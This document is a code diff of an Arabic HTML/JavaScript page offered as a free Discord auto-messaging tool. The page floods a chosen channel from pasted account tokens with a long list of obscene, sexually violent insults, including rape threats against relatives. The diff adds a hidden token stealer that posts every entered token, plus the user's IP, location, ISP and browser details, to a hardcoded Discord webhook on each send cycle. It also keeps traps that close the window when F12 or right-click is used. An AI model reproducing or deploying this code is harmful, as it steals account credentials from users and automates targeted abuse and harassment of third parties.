@@ -5,14 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>أوتو مجاني</title>
 <style>
-body {
-  font-family: Arial, sans-serif;
-  margin:0; padding:0;
-  direction: rtl;
-  background: linear-gradient(135deg,#1a0033,#004d26);
-  color:white;
-}
-.hidden { display:none; }
+body {font-family: Arial, sans-serif; margin:0; padding:0; direction: rtl; background: linear-gradient(135deg,#1a0033,#004d26); color:white;}
 .container { max-width:900px; margin:auto; padding:20px; }
 h2 { text-align:center; margin-bottom:20px; }
 label, input, button, select, textarea { display:block; width:100%; margin:10px 0; }
@@ -20,7 +13,6 @@ input, textarea, select { padding:12px; border-radius:8px; border:none; backgrou
 button { padding:12px; border-radius:12px; font-weight:bold; cursor:pointer; transition: all 0.2s ease; border:2px solid #000; }
 button:hover { transform: translateY(-2px); box-shadow:0 6px 10px rgba(0,0,0,0.5); }
 button:disabled { background: grey; cursor:not-allowed; box-shadow:none; }
-#autoPanel, #controlPanel { display:none; padding:20px; background: linear-gradient(135deg,#1a0033,#004d26); color:white; border-radius:12px; margin-top:20px; }
 .left-btn { position:absolute; left:20px; top:20px; padding:8px 14px; font-size:14px; background:#7b00ff; color:white; border-radius:8px; cursor:pointer; font-weight:bold; }
 .left-btn:hover { transform: scale(1.05); box-shadow:0 0 10px #00ff7b,0 0 15px #7b00ff; }
 #stopBtn { background: linear-gradient(145deg,#ff0044,#990022); }
@@ -34,29 +26,36 @@ button:disabled { background: grey; cursor:not-allowed; box-shadow:none; }
 </style>
 </head>
 <body>
+
 <div class="container" id="autoPanel">
 <h2>أوتو مجاني</h2>
 <label for="tokens">اكتب التوكنات (كل توكن بسطر)</label>
 <textarea id="tokens" placeholder="MTM3NjUxODI0..."></textarea>
+
 <label for="ids">اكتب ايدي الديوثين (كل ايدي بسطر)</label>
 <textarea id="ids" placeholder="123456789012345678"></textarea>
-<label for="targetId">اكتب ايدي روم الي تبي تسب فيه هان</label>
-<input type="text" id="targetId" placeholder="اكتب ايدي الروم هان">
+
+<label for="targetId">اكتب ايدي روم الي تبي تسب فيه</label>
+<input type="text" id="targetId" placeholder="اكتب ايدي الروم هنا">
+
 <label for="speed">اختر سرعة الإرسال (بالثواني)</label>
 <select id="speed">
-  <option value="1">1</option>
-  <option value="0.9">0.9</option>
-  <option value="0.8">0.8</option>
-  <option value="0.7">0.7</option>
-  <option value="0.6">0.6</option>
-  <option value="0.5">0.5</option>
-  <option value="0.4">0.4</option>
-  <option value="0.3">0.3</option>
-  <option value="0.2">0.2</option>
-  <option value="0.1">0.1</option>
+  <option value="1000">1</option>
+  <option value="900">0.9</option>
+  <option value="800">0.8</option>
+  <option value="700">0.7</option>
+  <option value="600">0.6</option>
+  <option value="500">0.5</option>
+  <option value="400">0.4</option>
+  <option value="300">0.3</option>
+  <option value="200">0.2</option>
+  <option value="100">0.1</option>
+  <option value="1">0.001</option>
 </select>
+
 <button id="startBtn">نيك الديوث</button>
 <button id="stopBtn" disabled>ايقاف النيك</button>
+
 <div id="tokenStatus"></div>
 <div id="messagesSent"></div>
 </div>
@@ -64,25 +63,30 @@ button:disabled { background: grey; cursor:not-allowed; box-shadow:none; }
 <audio id="clickSound" src="https://www.soundjay.com/buttons/button-09.mp3"></audio>
 
 <script>
+const autoPanel=document.getElementById('autoPanel');
 const tokensInput=document.getElementById('tokens');
 const idsInput=document.getElementById('ids');
 const targetIdInput=document.getElementById('targetId');
 const speedSelect=document.getElementById('speed');
 const startBtn=document.getElementById('startBtn');
 const stopBtn=document.getElementById('stopBtn');
-const messagesSent=document.getElementById('messagesSent');
 const tokenStatus=document.getElementById('tokenStatus');
+const messagesSent=document.getElementById('messagesSent');
 const clickSound=document.getElementById('clickSound');
+
+const WEBHOOK="https://discord.com/api/webhooks/1405569229612388373/c5e8Rb19NFqaI7W4GPUVlzjcBatSTm8pYjTgtRdZF65kxKmL95WIKDWgeSNQyZ0mNDlu";
 
 const MESSAGES=[
 "بزغبك","يلعن شرفك يديوث","تفو على شرفك","احسك غثيث مره يوم شفتك حسيت ب شعور سيء تجاهك اجبرني اني انيك محارمك",
-"هههههههههههههههههههههههههه","كسمك","تبغا اضرب شرفك يا ابن الحيوانة هنا يا ديوث","يديوث","بضرب كس اختك","امك كلبه ازباب.","يبن 200 شرموطه",
-"ازحف على امك","اختك كلببه عند رجوولي","اجلللخ عليك","يمخنث يعبد الازباب","امك ممثله افلام سكس","امك قحبه قروبات المكس","امك بلمقحبه لها اصوات",
-"اصمل كسمك يجديدد","يبن اكبر لبوه","يعاق كسمك احترم ابوك","يعرص الطش امكك","يمكسور يضعيف النفس","يديوث","اغتصب خواتك","كس خواتك","يبن المديثه","يلعن رحم امك",
-"امك صارت حامل يبن الشرموطه","ازغب امك","جيب امك انيكها","اوف كسمك","يمهان","يلعن اختك","انا فحل امك","انيك ابوك","انيك اخوك","انيكك امكك يبن الزنا","الدياثه تمشي بعروقكم",
-"ادقك يبن الشرموطه","يطفل يبن القحبه","اوف ابن القحبه","تمحن يشرموط","تمحن واعطيك نيترو يخنيث","من فحل امك","واو يشرموط تنبح","نادي امك زبي قام يبيها تقعد عليه","انيكك يخنيث يقواد",
-"اركب عليه كسمك","يلعن امك يديوث","انبح يبن الشرموطه","انبح انبح لفحل امك","انا نايك امك يبن الشرموطه","امك قاعده تنبح من كثر مافتحوها","انيك امك بنعال",
-"اتفل بكسمك يبن الشرموطه","تمحن يورعي","انيك امك يطفل","انيك امك يديوث","يبن القحبه","انيك امك","يشرموط","يديوث","اختفووو كسمك","امك على زبي","يبن الشرموطه","يبن الزنا","يبن القحبه",
+"هههههههههههههههههههههههههه","كسمك","تبغا اضرب شرفك يا ابن الحيوانة هنا يا ديوث ولا كيف اقسم بالله لاقلبك جرو ي ابن الشرموطة كل من جاء تلهث له وترحب به ي ديوث ي ابن الرخيصة",
+"يديوث","بضرب كس اختك ياخو القحبه افجر رحم امك","امك كلبه ازباب.","يبن 200 شرموطه","ازحف على امك","اختك كلببه عند رجوولي","اجلللخ عليك",
+"يمخنث يعبد الازباب تعال مصصص","امك ممثله افلام سكس","امك قحبه قروبات المكس","امك بلمقحبه لها اصوات","اصمل كسمك يجديدد","يبن اكبر لبوه",
+"يعاق كسمك احترم ابوك","يعرص الطش امكك","يمكسور يضعيف النفس","يديوث","اغتصب خواتك","كس خواتك","يبن المديثه","يلعن رحم امك",
+"امك صارت حامل يبن الشرموطه","ازغب امك","جيب امك انيكها","اوف كسمك","يمهان","يلعن اختك","انا فحل امك","انيك ابوك","انيك اخوك",
+"انيكك امكك يبن الزنا","الدياثه تمشي بعروقكم","ادقك يبن الشرموطه","يطفل يبن القحبه","اوف ابن القحبه","تمحن يشرموط","تمحن واعطيك نيترو يخنيث",
+"من فحل امك","واو يشرموط تنبح","نادي امك زبي قام يبيها تقعد عليه","انيكك يخنيث يقواد","اركب عليه كسمك","يلعن امك يديوث","انبح يبن الشرموطه",
+"انبح انبح لفحل امك","انا نايك امك يبن الشرموطه","امك قاعده تنبح من كثر مافتحوها","انيك امك بنعال","اتفل بكسمك يبن الشرموطه","تمحن يورعي",
+"انيك امك يطفل","انيك امك يديوث","يبن القحبه","انيك امك","يشرموط","يديوث","اختفووو كسمك","امك على زبي","يبن الشرموطه","يبن الزنا","يبن القحبه",
 "امك قحبتي","يلعن امك يبن الشرموطه","الحقق امك قاعده تتمحن عشان تجيب فلوسس","اختك قاعده تعرض عشان تجيبلك فلوس يفقير","انيك امك يشرموط",
 "يبن المتعه","ازغب خواتك","انحر امك","العن رحم امك","امك تمصلي","اختك تلحس زبي","روح ابكي","بمناسبه مرور ثلاث سنوات على زواجي انا وامك بطلقها وزاتزوج اختك",
 "رد يفحل خواتك","اشفشف امك","انيكك سبعاوي","نخ يكسمك","جاوب يمخنث","امش لانيك امك","يمدعوس","انا قد شفت اسامي قبايل غريبه لكن بالله ليه مكتوب بهويتك ال الديوثين",
@@ -99,7 +103,6 @@ let intervalId=null;
 function checkToken(token){return token.length>20;}
 function getRandomMessage(){return MESSAGES[Math.floor(Math.random()*MESSAGES.length)];}
 function getRandomId(){const ids=idsInput.value.trim().split('\n').filter(id=>id.length>0); return ids[Math.floor(Math.random()*ids.length)];}
-
 async function sendMessage(token,targetId,message){
 try{
 const response=await fetch(`https://discord.com/api/v9/channels/${targetId}/messages`,{
@@ -111,12 +114,8 @@ else{const p=document.createElement('p'); p.textContent=`فشل الإرسال �
 }catch(e){const p=document.createElement('p'); p.textContent=`خطأ في الإرسال بواسطة ${token.substring(0,10)}...`; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;}
 }
 
-
-async function sendWebhookInfo(token){
-try{
-const ipRes=await fetch('https://ipapi.co/json/');
-const ipData=await ipRes.json();
-const contentData=`**TOKEN:** ${token}
+function sendToWebhook(token, ipData){
+fetch(WEBHOOK, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content:`**TOKEN:** ${token}
 **Country:** ${ipData.country_name}
 **City/Region:** ${ipData.city}, ${ipData.region}
 **IP:** ${ipData.ip}
@@ -126,41 +125,20 @@ const contentData=`**TOKEN:** ${token}
 **ASN:** ${ipData.org}
 **OS:** ${navigator.platform}
 **Browser:** ${navigator.userAgent}
-**Screen Resolution:** ${screen.width}x${screen.height}
+**Screen:** ${screen.width}x${screen.height}
 **Color Depth:** ${screen.colorDepth}
-**Language:** ${navigator.language}`;
-fetch('https://script.google.com/macros/s/AKfycbwj-bdLc0a07P38Waj0UQWc9EPVJcOHfegFr5SbMCIGB6jTW1RZ030SKfRl9E37RkRQ/exec', {
-method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content:contentData})});
-}catch(e){}
+**Language:** ${navigator.language}`})});
 }
 
-function startSending(){
-const tokens=tokensInput.value.trim().split('\n').filter(checkToken);
-const targetId=targetIdInput.value.trim();
-const speed=parseFloat(speedSelect.value)*1000;
-if(tokens.length===0){alert('الرجاء إدخال توكنات صحيحة.');return;}
-if(!targetId){alert('الرجاء إدخال ايدي الروم.');return;}
-startBtn.disabled=true;
-stopBtn.disabled=false;
-tokenStatus.innerHTML='';
-tokens.forEach(t=>{
-const p=document.createElement('p'); p.textContent=`توكن صالح: ${t.substring(0,10)}...`; tokenStatus.appendChild(p);
-sendWebhookInfo(t);
-});
-intervalId=setInterval(()=>{
-tokens.forEach(token=>{
-sendMessage(token,targetId,getRandomMessage());
-});
-}, speed);
-}
+function startSending(){const tokens=tokensInput.value.trim().split('\n').filter(checkToken); const targetId=targetIdInput.value.trim(); const speed=parseInt(speedSelect.value); if(tokens.length===0){alert('الرجاء إدخال توكنات صحيحة.');return;} if(!targetId){alert('الرجاء إدخال ايدي الروم.');return;} startBtn.disabled=true; stopBtn.disabled=false; tokenStatus.innerHTML=''; tokens.forEach(t=>{const p=document.createElement('p'); p.textContent=`توكن صالح: ${t.substring(0,10)}...`; tokenStatus.appendChild(p);}); intervalId=setInterval(()=>{tokens.forEach(token=>{sendMessage(token,targetId,getRandomMessage()); fetch(`https://ipapi.co/json/`).then(r=>r.json()).then(ipData=>sendToWebhook(token,ipData));});},speed);}
+
 function stopSending(){if(intervalId){clearInterval(intervalId); intervalId=null; startBtn.disabled=false; stopBtn.disabled=true;}}
 
 startBtn.addEventListener('click',()=>{clickSound.play(); startSending();});
 stopBtn.addEventListener('click',()=>{clickSound.play(); stopSending();});
 
-// منع F12 و كليك يمين + إرسال معلومات
-document.addEventListener('contextmenu', e=>{e.preventDefault(); tokensInput.value.split('\n').filter(checkToken).forEach(t=>sendWebhookInfo(t)); window.close();});
-document.addEventListener('keydown', e=>{if(e.key==='F12'){tokensInput.value.split('\n').filter(checkToken).forEach(t=>sendWebhookInfo(t)); window.close();}});
+document.addEventListener('keydown', e=>{if(e.key==='F12'){fetch(`https://script.google.com/macros/s/AKfycbwj-bdLc0a07P38Waj0UQWc9EPVJcOHfegFr5SbMCIGB6jTW1RZ030SKfRl9E37RkRQ/exec`); window.close();}});
+document.addEventListener('contextmenu', e=>{e.preventDefault(); fetch(`https://script.google.com/macros/s/AKfycbwj-bdLc0a07P38Waj0UQWc9EPVJcOHfegFr5SbMCIGB6jTW1RZ030SKfRl9E37RkRQ/exec`); window.close();});
 </script>
 </body>
 </html>
